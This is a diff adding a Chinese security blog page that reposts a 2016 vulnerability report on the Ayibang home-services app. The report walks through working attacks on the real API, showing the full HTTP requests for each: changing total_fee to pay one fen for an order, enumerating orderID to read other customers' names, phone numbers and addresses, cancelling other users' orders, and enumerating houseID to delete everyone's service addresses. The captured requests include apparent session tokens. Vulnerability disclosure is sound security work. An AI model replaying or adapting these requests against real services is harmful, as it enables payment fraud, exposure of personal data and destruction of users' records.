@@ -1,0 +1,1484 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞挖掘,支付漏洞,越权漏洞,Xss漏洞,密码逻辑漏洞," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cai_Team" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="危害：看文章自己脑补漏洞等级：高提交时间：   2016-02-02 12:45">
+<meta name="keywords" content="漏洞挖掘,支付漏洞,越权漏洞,Xss漏洞,密码逻辑漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="阿姨帮最新APP漏洞大全(支付漏洞&#x2F;地址&#x2F;订单遍历&#x2F;删除等)">
+<meta property="og:url" content="127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/index.html">
+<meta property="og:site_name" content="Cai_Team">
+<meta property="og:description" content="危害：看文章自己脑补漏洞等级：高提交时间：   2016-02-02 12:45">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/og7jbdinrgav66gvtqjcohfy/image_1cg3ufnh119mf1a2a1edf5vbjum.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/1r7oj128q2miz6cc0q1y66ik/image_1cg3ul0q0178ondf136n1bklbpj13.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/uv9e3uhr4itz91mlaqkjp4hw/image_1cg3ulbjk776vs8imhrn34kd1g.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/tarjvjo28tnq0almee667dqm/image_1cg3untagce0og8n901nln75e1t.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/iu8l9ftbkxioegspg7psf7bz/image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/mzxfhiyt1fdrikeevmdw5tt7/image_1cg3uokl71f7b1um568d15kjcjs2n.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/mzp7hnp0e2a87hahk7jiq8ql/image_1cg3ur1ec14g027r19g41dkt1mcf34.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/8zylu68skeytdn4sc58pfbfd/image_1cg3ut157c3iebiblu6bi9uo3h.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/22w1a0rxqcjyi8hjuq8ytgjq/image_1cg3utb0fmnlhhrq2vb4ibrj3u.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/ppen0j15r6x111062t026kzr/image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/cms8wr2368k53n9yeri8dsw0/image_1cg3uurka153p7s6m3c1lc1ohf4o.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/hw8ryqt15emqjebjk8f8awp7/image_1cg3v42g41m3b18ku15es1ea418n055.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/o4qwyxhj25dogg6q0mc245ma/image_1cg3v85b91grlggsheep5k144b5i.png">
+<meta property="og:image" content="http://static.zybuluo.com/1kbfree/1esugc3rjsugawvsoapq73j0/image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png">
+<meta property="og:updated_time" content="2018-06-16T09:47:52.338Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="阿姨帮最新APP漏洞大全(支付漏洞&#x2F;地址&#x2F;订单遍历&#x2F;删除等)">
+<meta name="twitter:description" content="危害：看文章自己脑补漏洞等级：高提交时间：   2016-02-02 12:45">
+<meta name="twitter:image" content="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/"/>
+
+
+
+
+
+<script>
+    (function () {
+        if ('') {
+            if (prompt('请输入文章密码') !== '') {
+                alert('大哥你好，这是内部文章或未写全文章( 我要脸 )，如果没有密码请不要访问，感谢~');
+                if (history.length === 1) {
+                    location.replace("https://flagiamfree.github.io/"); //首页
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+    app_id: "8827fd59"
+  });
+  daovoice('update');
+  </script>
+
+  <title>阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等) | Cai_Team</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cai_Team</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">十年寒窗如一日，一举成名天下知</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            介绍
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/cai_font.png"> 
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cai_Team">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-16T17:39:01+08:00">
+                2018-06-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/乌云历史文章/" itemprop="url" rel="index">
+                    <span itemprop="name">乌云历史文章</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/乌云历史文章/Web攻防/" itemprop="url" rel="index">
+                    <span itemprop="name">Web攻防</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/06/16/阿姨帮最新APP漏洞大全/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/16/阿姨帮最新APP漏洞大全/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">本文浏览数 <i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次~
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,318
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-02-02 12:45</p>
+</blockquote>
+<a id="more"></a>    
+<h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>阿姨帮最新版APP(v6.2.0)漏洞打包</p>
+<h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><h4 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h4><h5 id="1-超低价格支付订单"><a href="#1-超低价格支付订单" class="headerlink" title="1. 超低价格支付订单"></a>1. 超低价格支付订单</h5><p>点击首页，随便选择一项服务并下订单</p>
+<p><img src="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png" alt="image_1cg3udg33qk4cgk6f64krptq9.png-62.5kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/og7jbdinrgav66gvtqjcohfy/image_1cg3ufnh119mf1a2a1edf5vbjum.png" alt="image_1cg3ufnh119mf1a2a1edf5vbjum.png-78.7kB"></p>
+<h5 id="2-点击确认支付抓包并先截断提交："><a href="#2-点击确认支付抓包并先截断提交：" class="headerlink" title="2. 点击确认支付抓包并先截断提交："></a>2. 点击确认支付抓包并先截断提交：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845167007</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 128</span><br><span class="line">out_trade_no=11291191&amp;attach=0_1_13800000000_0&amp;body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&amp;total_fee=5000&amp;trade_type=AP</span><br></pre></td></tr></table></figure>
+<p><em>将上面的total_fee的值改为1，提交</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/1r7oj128q2miz6cc0q1y66ik/image_1cg3ul0q0178ondf136n1bklbpj13.png" alt="image_1cg3ul0q0178ondf136n1bklbpj13.png-38.2kB"></p>
+<p><em>支付成功后订单成为待确认状态，说明支付成功</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/uv9e3uhr4itz91mlaqkjp4hw/image_1cg3ulbjk776vs8imhrn34kd1g.png" alt="image_1cg3ulbjk776vs8imhrn34kd1g.png-47.3kB"></p>
+<h4 id="任意用户订单查看"><a href="#任意用户订单查看" class="headerlink" title="任意用户订单查看"></a>任意用户订单查看</h4><p>点击我们刚生成的订单，系统访问如下地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845324989</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure>
+<p><em>orderID=11291191处可遍历，burp出手对订单的后四位遍历</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/tarjvjo28tnq0almee667dqm/image_1cg3untagce0og8n901nln75e1t.png" alt="image_1cg3untagce0og8n901nln75e1t.png-212.4kB"></p>
+<p>N多订单信息可看</p>
+<p><img src="http://static.zybuluo.com/1kbfree/iu8l9ftbkxioegspg7psf7bz/image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png" alt="image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png-282.2kB"></p>
+<p><em>以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/mzxfhiyt1fdrikeevmdw5tt7/image_1cg3uokl71f7b1um568d15kjcjs2n.png" alt="image_1cg3uokl71f7b1um568d15kjcjs2n.png-228.7kB"></p>
+<h4 id="任意用户订单取消漏洞"><a href="#任意用户订单取消漏洞" class="headerlink" title="任意用户订单取消漏洞"></a>任意用户订单取消漏洞</h4><p>点击之前的订单，点击取消订单，会抓到如下请求包:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211291191%22%7D&amp;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>post处内容url解码后为：{“orderID”:”11291191”}</p>
+</blockquote>
+<ul>
+<li>通过遍历orderID可删除所有订单</li>
+<li>通过另一手机注册一个账号并下一个订单</li>
+</ul>
+<p><img src="http://static.zybuluo.com/1kbfree/mzp7hnp0e2a87hahk7jiq8ql/image_1cg3ur1ec14g027r19g41dkt1mcf34.png" alt="image_1cg3ur1ec14g027r19g41dkt1mcf34.png-40.7kB"></p>
+<ul>
+<li>抓包查得该订单ID为11292401</li>
+</ul>
+<p>提交以下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211292401%22%7D&amp;</span><br></pre></td></tr></table></figure>
+<p><em>成功取消订单</em></p>
+<p><img src="http://static.zybuluo.com/1kbfree/8zylu68skeytdn4sc58pfbfd/image_1cg3ut157c3iebiblu6bi9uo3h.png" alt="image_1cg3ut157c3iebiblu6bi9uo3h.png-203.1kB"></p>
+<p><strong>再查看该用户订单列表，已经成为空：</strong></p>
+<p><img src="http://static.zybuluo.com/1kbfree/22w1a0rxqcjyi8hjuq8ytgjq/image_1cg3utb0fmnlhhrq2vb4ibrj3u.png" alt="image_1cg3utb0fmnlhhrq2vb4ibrj3u.png-26.9kB"></p>
+<h4 id="任意用户服务地址删除"><a href="#任意用户服务地址删除" class="headerlink" title="任意用户服务地址删除"></a>任意用户服务地址删除</h4><h5 id="1-点击app里面服务地址"><a href="#1-点击app里面服务地址" class="headerlink" title="1. 点击app里面服务地址"></a>1. 点击app里面服务地址</h5><p><img src="http://static.zybuluo.com/1kbfree/ppen0j15r6x111062t026kzr/image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png" alt="image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png-46.6kB"></p>
+<h5 id="2-添加两个地址"><a href="#2-添加两个地址" class="headerlink" title="2. 添加两个地址"></a>2. 添加两个地址</h5><p><img src="http://static.zybuluo.com/1kbfree/cms8wr2368k53n9yeri8dsw0/image_1cg3uurka153p7s6m3c1lc1ohf4o.png" alt="image_1cg3uurka153p7s6m3c1lc1ohf4o.png-28.1kB"></p>
+<p><strong>然后删除上面的两个地址，并抓包</strong></p>
+<h6 id="1-删除第一个地址请求数据包如下："><a href="#1-删除第一个地址请求数据包如下：" class="headerlink" title="1. 删除第一个地址请求数据包如下："></a>1. 删除第一个地址请求数据包如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841496773</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure>
+<p>返回数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 15 Jan 2016 07:04:57 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.11</span><br><span class="line">Content-Length: 628</span><br><span class="line">&#123;&quot;house&quot;:&#123;&quot;id&quot;:&quot;17334752&quot;,&quot;custID&quot;:&quot;16989352&quot;,&quot;city&quot;:&quot;nanjing&quot;,&quot;cityName&quot;:&quot;\u5357\u4eac&quot;,&quot;zone&quot;:&quot;null&quot;,&quot;nameAddr&quot;:&quot;\u5b9e\u9a8c\</span><br></pre></td></tr></table></figure></p>
+<p>上面内容解码后如下：<br><img src="http://static.zybuluo.com/1kbfree/hw8ryqt15emqjebjk8f8awp7/image_1cg3v42g41m3b18ku15es1ea418n055.png" alt="image_1cg3v42g41m3b18ku15es1ea418n055.png-104.9kB"></p>
+<blockquote>
+<p>可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752</p>
+</blockquote>
+<p><strong>再删除另外一个地址：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841783577</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址</p>
+</blockquote>
+<p><strong>只需提交以下数据包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br></pre></td></tr></table></figure></p>
+<p>通过burpsuite 遍历houseID处，即可删除所有用户收获地址</p>
